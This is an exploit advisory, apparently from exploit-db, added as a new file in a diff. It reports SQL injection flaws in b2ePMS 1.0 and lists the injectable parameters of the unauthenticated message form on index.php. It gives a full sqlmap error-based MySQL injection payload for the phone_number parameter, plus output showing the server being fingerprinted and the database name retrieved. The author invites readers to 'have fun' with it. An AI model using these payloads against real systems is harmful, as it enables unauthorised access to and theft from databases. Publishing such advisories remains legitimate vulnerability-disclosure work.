@@ -1,0 +1,57 @@
+# Title: b2ePMS 1.0 multiple SQLi Vulnerabilities
+# Version: 1.0
+# Author/Found by: loneferret
+# Manifacturer/Software link: https://developer.berlios.de/projects/b2epms/
+# Other vulnerability: http://www.exploit-db.com/exploits/18882/
+ 
+# Date found: May 27th 2012
+# Tested on: Ubuntu Server 8.04 / PHP Version 5.2.4-2ubuntu5.23
+ 
+# Vulnerability:
+# Due to improper input sanitization, pretty much every conceivable parameter is 
+# SQL injectable. Although to exploit many of these parameters, one needs to be logged
+# in, but the main page (index.php) offers a form to send a recipient a message. 
+# This form does not require authentication.
+ 
+# Severity:
+# Well if anyone actually uses this, I suppose it would be high. But if you're like me
+# and just call the person back, you should be safe.
+ 
+# As always you can have as much fun with this...
+# I'm going to be lazy with this one and pretty much show sqlmap's info etc.
+
+PoC:
+
+Method = POST
+Page: /index.php
+Parameters effected:
+  phone_number
+  msg_caller
+  phone_msg
+  msg_options
+  msg_recipients[]
+  signed
+Payload:phone_number=[SQLi]&msg_caller=[SQLi]&phone_msg=[SQLi]msg_options=[SQLi]&msg_recipients[]=[SQLi]&signed=[SQLi]&Submit=Send
+ 
+ 
+Sqlmap:
+---
+Place: POST
+Parameter: phone_number
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: phone_number=lGGf' AND (SELECT 4115 FROM(SELECT COUNT(*),CONCAT(0x3a6b6b653a,(SELECT (CASE WHEN
+ (4115=4115) THEN 1 ELSE 0 END)),0x3a6775633a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY
+ x)a) AND 'sTBK'='sTBK&msg_caller=BSdf&phone_msg=gFqd&msg_options=Please call&msg_recipients[]=test@test.com&
+signed=LOCY&Submit=Send
+---
+
+Possible output:
+[11:03:15] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 8.04 (Hardy Heron)
+web application technology: PHP 5.2.4, Apache 2.2.8
+back-end DBMS: MySQL 5.0
+[11:03:15] [INFO] fetching current database
+[11:03:15] [INFO] heuristics detected web page charset 'ascii'
+[11:03:15] [INFO] retrieved: b2epms
+current database:    'b2epms'
